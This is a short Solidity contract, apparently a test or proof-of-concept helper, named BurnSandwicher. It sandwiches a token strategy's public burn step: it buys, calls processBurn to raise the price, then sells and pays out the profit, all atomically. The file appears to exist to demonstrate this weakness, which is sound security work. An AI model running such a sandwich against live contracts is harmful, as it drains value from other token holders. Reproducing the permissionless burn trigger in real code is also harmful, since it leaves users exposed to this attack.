// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {SweepNFTStrategy} from "../../src/SweepNFTStrategy.sol";
import {SweepSwapRouter} from "../../src/SweepSwapRouter.sol";

/// @notice Front-runs a burn pass with a buy, triggers the pass itself, and sells into the price
/// the burn pushed up — atomically, so there is no mempool risk at all.
contract BurnSandwicher {
    /// @notice Runs the sandwich and returns the ETH it ended with.
    function run(SweepSwapRouter router, SweepNFTStrategy strategy) external payable returns (uint256) {
        uint256 bought = router.buy{value: msg.value}(address(strategy), 0, block.timestamp);
        strategy.processBurn();
        strategy.approve(address(router), bought);
        router.sell(address(strategy), bought, 0, block.timestamp);
        uint256 out = address(this).balance;
        payable(msg.sender).transfer(out);
        return out;
    }

    receive() external payable {}
}
